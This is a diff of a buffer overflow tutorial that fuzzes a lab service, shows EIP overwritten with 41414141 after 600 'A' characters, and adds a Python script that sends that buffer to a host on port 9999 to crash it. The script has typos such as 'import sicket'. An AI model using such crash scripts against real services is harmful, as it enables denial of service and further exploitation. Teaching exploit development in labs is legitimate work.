@@ -82,9 +82,40 @@ while (counter<=5012):
 print(len(payload))
 ```
 
-That's Great Let's run our fuzzer to Discover crash on application  
+That's Great Let's run our fuzzer to Discover crash on application: 
 
+![Screen Shot 2021-08-26 at 2 06 17 AM](https://user-images.githubusercontent.com/47929033/130880235-d06b1266-0fa1-40c3-8cfa-4f5e77a413b9.png) 
 
+as you can see fuzzer stoped with string of `AAA` how to know number of `A` ? it's very simple let me to create a file with `touch aa.txt` and copy string to file and use command: `cat aa.txt | wc -c`:
+
+![Screen Shot 2021-08-26 at 2 07 45 AM](https://user-images.githubusercontent.com/47929033/130880433-95cb1c84-9dcc-4192-b79b-173a7490b81c.png)
+
+as you can see tha programe crased and EIP register: `41414141`
+
+The string that crased applicaton: `600` of `A`, That's Great now we can write a exploit to know which four bytes that OverWrtie `EIP`: 
+
+## Hint : CTR+F2 to restart debugger ans service  and F9 to run service an debugger 
+
+```
+#!/usr/bin/python 
+import sicket 
+
+buffer = 'A' * 600 
+
+print 'payload sent'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+
+s.connect(('192.168.1.15',9999))
+
+s.send(buffer + "\r\n")
+
+s.recv(1024)
+
+s.close()
+
+```
+I will run exploit to see the programe crash or not : 
 
 
 
